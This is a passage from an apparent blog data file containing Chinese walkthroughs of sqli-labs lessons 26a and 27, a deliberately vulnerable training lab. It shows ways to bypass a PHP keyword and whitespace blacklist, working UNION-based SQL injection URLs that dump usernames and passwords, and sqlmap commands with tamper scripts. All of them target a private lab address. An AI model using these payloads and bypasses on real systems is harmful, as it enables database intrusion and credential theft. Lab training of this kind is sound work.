class=\"string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out slashes</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$id</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>和Lesson-26一样过滤了or,and,/,*,#,空格,\\。过滤方式没有变化。但是这里不能利用报错注入了。</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=2&#39;)%26%26(&#39;1</code></p>\n<p>使用了<code>（&#39;&#39;）</code>进行闭合。</p>\n<p><img src=\"/img/sql/Lesson-26a/002.png\" alt=\"002\"></p>\n<h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select%A01,2,3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/003.png\" alt=\"003\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select%A01,(database()),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/004.png\" alt=\"004\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/005.png\" alt=\"005\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/006.png\" alt=\"006\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,passwoorrd))from(security.users)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>拿直接的绕过脚本直接用就可以了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26a/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-26a/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-26a/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-26a/011.png\" alt=\"011\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-26a/012.png\" alt=\"012\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-26a/013.png\" alt=\"013\"></p>\n"},{"title":"sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号","date":"2018-10-06T07:18:50.000Z","_content":"\n# sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-27/001.png)\n\n## 分析\n\n切换PHP-5.4.45版本。\n\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//过滤 / 和 *\n$id= preg_replace('/[--]/',\"\", $id);\t//过滤 -\n$id= preg_replace('/[#]/',\"\", $id);\t\t//过滤 #\n$id= preg_replace('/[ +]/',\"\", $id);\t//过滤 空格 和 +\n$id= preg_replace('/select/m',\"\", $id);\t//过滤 select  /m:将字符串视为多行\n$id= preg_replace('/[ +]/',\"\", $id);\t//过滤 空格 和 +\n$id= preg_replace('/union/s',\"\", $id);\t//过滤 union\n$id= preg_replace('/select/s',\"\", $id);\t//过滤 select\n$id= preg_replace('/UNION/s',\"\", $id);\t//过滤 UNION\n$id= preg_replace('/SELECT/s',\"\", $id);\t//过滤 SELECT\n$id= preg_replace('/Union/s',\"\", $id);\t//过滤 Union\n$id= preg_replace('/Select/s',\"\", $id);\t//过滤 Select\nreturn $id;\n}\n```\n\n\n\n过滤了union和select,但是Mysql的关键字是不区分大小写的,可以混淆大小写绕过。\n\n### 绕过Union和Select\n\n1. 混淆大小写\n\n   使用类似uNion和sElect的随机大小写替换\n\n2. 双写绕过\n\n   union能用类似于ununionion绕过\n\n   select能使selseselectlectect绕过\n\n### 绕过空格\n\n1. /**/ \n\n被本课的/*过滤\n\n2. `/**_**/`\n\n被本课的/*过滤\n\n3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`\n\n分别被本课的#过滤和--过滤\n\n4. 空白符替换\n\n    %09 TAB键（水平） 可以\n    \n    %0A 新建一行\t可以\n    \n    %0B TAB键（垂直） 可以\n    \n    %0C 新的一页\t可以\n    \n    %0D return功能\t可以\n    \n    %A0 空格   这里用不了\n\n5. 用()绕过,意思就是不使用任何空格\n\n## 手注\n\n### 判断类型\n\n`http://192.168.75.132/sql/Less-27/?id=2'and'1`\n\n![002](/img/sql/Lesson-27/002.png)\n\n单引号闭合。\n\n### 获取字段数\n\n`http://192.168.75.132/sql/Less-27/?id=2'%09uNion%09seLect%091,2,3%09and'1`\n\n![003](/img/sql/Lesson-27/003.png)\n\n### 直接上结果\n\n`http://192.168.75.132/sql/Less-27/?id=1'%09and%091=2%09uNion%09seLect%091,(seLect%09group_concat(id,'~',username,'~',password)%09from%09security.users%09),3%09and'1`\n\n![004](/img/sql/Lesson-27/004.png)\n\n## SQLMAP\n\n这次跑的有点久,多了一个UnionSelect.py绕过union和select。\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces union to ununionion,select to selseselectlectect\n    >>> tamper('union select')\n    'ununionion selseselectlectect'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)(union)\", r\"ununionion\", re.sub(r\"(?i)(select)\", \"selseselectlectect\", payload))\n\n    return retVal\n```\n\n\n\n```\nUnionSelect.py：将union替代ununionion,select替代selseselectlectect\nspace0A.py\t：将空格替代为%0A\ncount.py\t：将count(*)替换成count(1)\n```\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --flush-session --fresh-queries -v 3`\n\n![005](/img/sql/Lesson-27/005.png)\n\n![006](/img/sql/Lesson-27/006.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --dbs`\n\n![007](/img/sql/Lesson-27/007.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security --tables`\n\n![008](/img/sql/Lesson-27/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![009](/img/sql/Lesson-27/009.png)","source":"_posts/sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号.md","raw":"---\ntitle: sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号\ndate: 2018-10-06 15:18:50\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-27/001.png)\n\n## 分析\n\n切换PHP-5.4.45版本。\n\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//过滤 / 和 *\n$id= preg_replace('/[--]/',\"\", $id);\t//过滤 -\n$id= preg_replace('/[#]/',\"\", $id);\t\t//过滤 #\n$id= preg_replace('/[ +]/',\"\", $id);\t//过滤 空格 和 +\n$id= preg_replace('/select/m',\"\", $id);\t//过滤 select  /m:将字符串视为多行\n$id= preg_replace('/[ +]/',\"\", $id);\t//过滤 空格 和 +\n$id= preg_replace('/union/s',\"\", $id);\t//过滤 union\n$id= preg_replace('/select/s',\"\", $id);\t//过滤 select\n$id= preg_replace('/UNION/s',\"\", $id);\t//过滤 UNION\n$id= preg_replace('/SELECT/s',\"\", $id);\t//过滤 SELECT\n$id= preg_replace('/Union/s',\"\", $id);\t//过滤 Union\n$id= preg_replace('/Select/s',\"\", $id);\t//过滤 Select\nreturn $id;\n}\n```\n\n\n\n过滤了union和select,但是Mysql的关键字是不区分大小写的,可以混淆大小写绕过。\n\n### 绕过Union和Select\n\n1. 混淆大小写\n\n   使用类似uNion和sElect的随机大小写替换\n\n2. 双写绕过\n\n   union能用类似于ununionion绕过\n\n   select能使selseselectlectect绕过\n\n### 绕过空格\n\n1. /**/ \n\n被本课的/*过滤\n\n2. `/**_**/`\n\n被本课的/*过滤\n\n3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`\n\n分别被本课的#过滤和--过滤\n\n4. 空白符替换\n\n    %09 TAB键（水平） 可以\n    \n    %0A 新建一行\t可以\n    \n    %0B TAB键（垂直） 可以\n    \n    %0C 新的一页\t可以\n    \n    %0D return功能\t可以\n    \n    %A0 空格   这里用不了\n\n5. 用()绕过,意思就是不使用任何空格\n\n## 手注\n\n### 判断类型\n\n`http://192.168.75.132/sql/Less-27/?id=2'and'1`\n\n![002](/img/sql/Lesson-27/002.png)\n\n单引号闭合。\n\n### 获取字段数\n\n`http://192.168.75.132/sql/Less-27/?id=2'%09uNion%09seLect%091,2,3%09and'1`\n\n![003](/img/sql/Lesson-27/003.png)\n\n### 直接上结果\n\n`http://192.168.75.132/sql/Less-27/?id=1'%09and%091=2%09uNion%09seLect%091,(seLect%09group_concat(id,'~',username,'~',password)%09from%09security.users%09),3%09and'1`\n\n![004](/img/sql/Lesson-27/004.png)\n\n## SQLMAP\n\n这次跑的有点久,多了一个UnionSelect.py绕过union和select。\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces union to ununionion,select to selseselectlectect\n    >>> tamper('union select')\n    'ununionion selseselectlectect'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)(union)\", r\"ununionion\", re.sub(r\"(?i)(select)\", \"selseselectlectect\", payload))\n\n    return retVal\n```\n\n\n\n```\nUnionSelect.py：将union替代ununionion,select替代selseselectlectect\nspace0A.py\t：将空格替代为%0A\ncount.py\t：将count(*)替换成count(1)\n```\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --flush-session --fresh-queries -v 3`\n\n![005](/img/sql/Lesson-27/005.png)\n\n![006](/img/sql/Lesson-27/006.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --dbs`\n\n![007](/img/sql/Lesson-27/007.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security --tables`\n\n![008](/img/sql/Lesson-27/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27/?id=1\" --technique E --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![009](/img/sql/Lesson-27/009.png)","slug":"sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号","published":1,"updated":"2019-06-19T17:23:13.389Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdi003e4dsb1hu87hku","content":"<h1 id=\"sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号\"><a href=\"#sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号\" class=\"headerlink\" title=\"sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号\"></a>sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-27/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>切换PHP-5.4.45版本。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 / 和 *</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 -</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 #</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 空格 和 +</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/select/m'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 select  /m:将字符串视为多行</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 空格 和 +</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/union/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 union</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/select/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 select</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/UNION/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 UNION</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/SELECT/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 SELECT</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/Union/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 Union</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/Select/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 Select</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了union和select,但是Mysql的关键字是不区分大小写的,可以混淆大小写绕过。</p>\n<h3 id=\"绕过Union和Select\"><a href=\"#绕过Union和Select\" class=\"headerlink\" title=\"绕过Union和Select\"></a>绕过Union和Select</h3><ol>\n<li><p>混淆大小写</p>\n<p>使用类似uNion和sElect的随机大小写替换</p>\n</li>\n<li><p>双写绕过</p>\n<p>union能用类似于ununionion绕过</p>\n<p>select能使selseselectlectect绕过</p>\n</li>\n</ol>\n<h3 id=\"绕过空格\"><a href=\"#绕过空格\" class=\"headerlink\" title=\"绕过空格\"></a>绕过空格</h3><ol>\n<li>/**/ </li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"2\">\n<li><code>/**_**/</code></li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"3\">\n<li>#加一个换行符<code>%23%0A</code>和<code>--</code>加一个换行符<code>--%0A</code></li>\n</ol>\n<p>分别被本课的#过滤和–过滤</p>\n<ol start=\"4\">\n<li><p>空白符替换</p>\n<p> %09 TAB键（水平） 可以</p>\n<p> %0A 新建一行    可以</p>\n<p> %0B TAB键（垂直） 可以</p>\n<p> %0C 新的一页    可以</p>\n<p> %0D return功能    可以</p>\n<p> %A0 空格   这里用不了</p>\n</li>\n<li><p>用()绕过,意思就是不使用任何空格</p>\n</li>\n</ol>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.132/sql/Less-27/?id=2&#39;and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/002.png\" alt=\"002\"></p>\n<p>单引号闭合。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.132/sql/Less-27/?id=2&#39;%09uNion%09seLect%091,2,3%09and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/003.png\" alt=\"003\"></p>\n<h3 id=\"直接上结果\"><a href=\"#直接上结果\" class=\"headerlink\" title=\"直接上结果\"></a>直接上结果</h3><p><code>http://192.168.75.132/sql/Less-27/?id=1&#39;%09and%091=2%09uNion%09seLect%091,(seLect%09group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)%09from%09security.users%09),3%09and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/004.png\" alt=\"004\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>这次跑的有点久,多了一个UnionSelect.py绕过union和select。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces union to ununionion,select to selseselectlectect</span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('union select')</span></span><br><span class=\"line\"><span class=\"string\">    'ununionion selseselectlectect'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)(union)\"</span>, <span class=\"string\">r\"ununionion\"</span>, re.sub(<span class=\"string\">r\"(?i)(select)\"</span>, <span class=\"string\">\"selseselectlectect\"</span>, payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UnionSelect.py：将<span class=\"class\"><span class=\"keyword\">union</span>替代<span class=\"title\">ununionion</span>,<span class=\"title\">select</span>替代<span class=\"title\">selseselectlectect</span></span></span><br><span class=\"line\">space0A.py\t：将空格替代为%<span class=\"number\">0</span>A</span><br><span class=\"line\">count.py\t：将count(*)替换成count(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-27/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-27/006.png\" alt=\"006\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-27/007.png\" alt=\"007\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-27/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-27/009.png\" alt=\"009\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号\"><a href=\"#sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号\" class=\"headerlink\" title=\"sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号\"></a>sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-27/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>切换PHP-5.4.45版本。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 / 和 *</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 -</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 #</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 空格 和 +</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/select/m'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 select  /m:将字符串视为多行</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 空格 和 +</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/union/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 union</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/select/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 select</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/UNION/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 UNION</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/SELECT/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 SELECT</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/Union/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 Union</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/Select/s'</span>,<span class=\"string\">\"\"</span>, $id);\t<span class=\"comment\">//过滤 Select</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了union和select,但是Mysql的关键字是不区分大小写的,可以混淆大小写绕过。</p>\n<h3 id=\"绕过Union和Select\"><a href=\"#绕过Union和Select\" class=\"headerlink\" title=\"绕过Union和Select\"></a>绕过Union和Select</h3><ol>\n<li><p>混淆大小写</p>\n<p>使用类似uNion和sElect的随机大小写替换</p>\n</li>\n<li><p>双写绕过</p>\n<p>union能用类似于ununionion绕过</p>\n<p>select能使selseselectlectect绕过</p>\n</li>\n</ol>\n<h3 id=\"绕过空格\"><a href=\"#绕过空格\" class=\"headerlink\" title=\"绕过空格\"></a>绕过空格</h3><ol>\n<li>/**/ </li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"2\">\n<li><code>/**_**/</code></li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"3\">\n<li>#加一个换行符<code>%23%0A</code>和<code>--</code>加一个换行符<code>--%0A</code></li>\n</ol>\n<p>分别被本课的#过滤和–过滤</p>\n<ol start=\"4\">\n<li><p>空白符替换</p>\n<p> %09 TAB键（水平） 可以</p>\n<p> %0A 新建一行    可以</p>\n<p> %0B TAB键（垂直） 可以</p>\n<p> %0C 新的一页    可以</p>\n<p> %0D return功能    可以</p>\n<p> %A0 空格   这里用不了</p>\n</li>\n<li><p>用()绕过,意思就是不使用任何空格</p>\n</li>\n</ol>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" 